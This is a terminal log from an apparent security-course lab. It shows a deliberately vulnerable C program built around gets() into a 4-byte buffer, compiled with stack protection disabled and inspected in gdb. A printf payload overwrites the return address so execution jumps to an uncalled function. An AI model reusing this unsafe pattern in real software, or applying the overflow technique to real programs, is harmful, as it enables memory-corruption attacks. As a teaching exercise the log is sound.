@@ -1,0 +1,187 @@
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ cat run_dead.c
+/* This program is used for demonstrating how to activate dead code using buffer overflow attacks*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+void deadCode()
+{
+  printf("I'm alive!");
+  exit(0);
+}
+
+void getData()
+{
+  char buffer[4];
+  gets(buffer);
+  puts(buffer);
+}
+
+int main()
+{
+  getData();
+  return 0;
+}
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gcc run_dead.c -o run_dead -mpreferred-stack-boundary=2 -fno-stack-protector -g
+run_dead.c: In function ‘getData’:
+run_dead.c:15:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
+   gets(buffer);
+   ^
+/tmp/cclCGpVH.o: In function `getData':
+/home/user/Documents/ENPM-691/C Programs/run_dead.c:15: warning: the `gets' function is dangerous and should not be used.
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gdb run_dead -q
+Reading symbols from run_dead...done.
+(gdb) info functions
+All defined functions:
+
+File run_dead.c:
+void deadCode();
+void getData();
+int main();
+
+Non-debugging symbols:
+0x08048308  _init
+0x08048340  printf@plt
+0x08048350  gets@plt
+0x08048360  puts@plt
+0x08048370  exit@plt
+0x08048380  __libc_start_main@plt
+0x080483a0  _start
+0x080483d0  __x86.get_pc_thunk.bx
+0x080483e0  deregister_tm_clones
+0x08048410  register_tm_clones
+0x08048450  __do_global_dtors_aux
+0x08048470  frame_dummy
+0x080484f0  __libc_csu_init
+0x08048550  __libc_csu_fini
+0x08048554  _fini
+(gdb) disass main
+Dump of assembler code for function main:
+   0x080484d3 <+0>:	push   %ebp
+   0x080484d4 <+1>:	mov    %esp,%ebp
+   0x080484d6 <+3>:	call   0x80484b2 <getData>
+   0x080484db <+8>:	mov    $0x0,%eax
+   0x080484e0 <+13>:	pop    %ebp
+   0x080484e1 <+14>:	ret    
+End of assembler dump.
+(gdb) list 1
+1	/* This program is used for demonstrating how to activate dead code using buffer overflow attacks*/
+2	
+3	#include <stdio.h>
+4	#include <stdlib.h>
+5	
+6	void deadCode()
+7	{
+8	  printf("I'm alive!");
+9	  exit(0);
+10	}
+(gdb) 
+11	
+12	void getData()
+13	{
+14	  char buffer[4];
+15	  gets(buffer);
+16	  puts(buffer);
+17	}
+18	
+19	int main()
+20	{
+(gdb) 
+21	  getData();
+22	  return 0;
+23	}
+(gdb) disass getData
+Dump of assembler code for function getData:
+   0x080484b2 <+0>:	push   %ebp
+   0x080484b3 <+1>:	mov    %esp,%ebp
+   0x080484b5 <+3>:	sub    $0x4,%esp
+   0x080484b8 <+6>:	lea    -0x4(%ebp),%eax
+   0x080484bb <+9>:	push   %eax
+   0x080484bc <+10>:	call   0x8048350 <gets@plt>
+   0x080484c1 <+15>:	add    $0x4,%esp
+   0x080484c4 <+18>:	lea    -0x4(%ebp),%eax
+   0x080484c7 <+21>:	push   %eax
+   0x080484c8 <+22>:	call   0x8048360 <puts@plt>
+   0x080484cd <+27>:	add    $0x4,%esp
+   0x080484d0 <+30>:	nop
+   0x080484d1 <+31>:	leave  
+   0x080484d2 <+32>:	ret    
+End of assembler dump.
+(gdb) quit
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gcc run_dead.c -o run_dead -mpreferred-stack-boundary=2 -fno-stack-protector zexecstack
+gcc: error: zexecstack: No such file or directory
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gcc run_dead.c -o run_dead -mpreferred-stack-boundary=2 -fno-stack-protector -zexecstack
+run_dead.c: In function ‘getData’:
+run_dead.c:15:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
+   gets(buffer);
+   ^
+/tmp/ccPOoKEY.o: In function `getData':
+run_dead.c:(.text+0x22): warning: the `gets' function is dangerous and should not be used.
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gdb run_dead -qReading symbols from run_dead...(no debugging symbols found)...done.
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048308  _init
+0x08048340  printf@plt
+0x08048350  gets@plt
+0x08048360  puts@plt
+0x08048370  exit@plt
+0x08048380  __libc_start_main@plt
+0x080483a0  _start
+0x080483d0  __x86.get_pc_thunk.bx
+0x080483e0  deregister_tm_clones
+0x08048410  register_tm_clones
+0x08048450  __do_global_dtors_aux
+0x08048470  frame_dummy
+0x0804849b  deadCode
+0x080484b2  getData
+0x080484d3  main
+0x080484f0  __libc_csu_init
+0x08048550  __libc_csu_fini
+0x08048554  _fini
+(gdb) disass main
+Dump of assembler code for function main:
+   0x080484d3 <+0>:	push   %ebp
+   0x080484d4 <+1>:	mov    %esp,%ebp
+   0x080484d6 <+3>:	call   0x80484b2 <getData>
+   0x080484db <+8>:	mov    $0x0,%eax
+   0x080484e0 <+13>:	pop    %ebp
+   0x080484e1 <+14>:	ret    
+End of assembler dump.
+(gdb) disass getData
+Dump of assembler code for function getData:
+   0x080484b2 <+0>:	push   %ebp
+   0x080484b3 <+1>:	mov    %esp,%ebp
+   0x080484b5 <+3>:	sub    $0x4,%esp
+   0x080484b8 <+6>:	lea    -0x4(%ebp),%eax
+   0x080484bb <+9>:	push   %eax
+   0x080484bc <+10>:	call   0x8048350 <gets@plt>
+   0x080484c1 <+15>:	add    $0x4,%esp
+   0x080484c4 <+18>:	lea    -0x4(%ebp),%eax
+   0x080484c7 <+21>:	push   %eax
+   0x080484c8 <+22>:	call   0x8048360 <puts@plt>
+   0x080484cd <+27>:	add    $0x4,%esp
+   0x080484d0 <+30>:	nop
+   0x080484d1 <+31>:	leave  
+   0x080484d2 <+32>:	ret    
+End of assembler dump.
+(gdb) disass deadCode
+Dump of assembler code for function deadCode:
+   0x0804849b <+0>:	push   %ebp
+   0x0804849c <+1>:	mov    %esp,%ebp
+   0x0804849e <+3>:	push   $0x8048570
+   0x080484a3 <+8>:	call   0x8048340 <printf@plt>
+   0x080484a8 <+13>:	add    $0x4,%esp
+   0x080484ab <+16>:	push   $0x0
+   0x080484ad <+18>:	call   0x8048370 <exit@plt>
+End of assembler dump.
+(gdb) quit
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ printf "12345678\x9b\x84\x04\x08" | ./run_dead
+12345678��
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ ./run_dead
+12345678\x9b\x84\x04\x08
+12345678\x9b\x84\x04\x08
+Segmentation fault (core dumped)
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ 
+
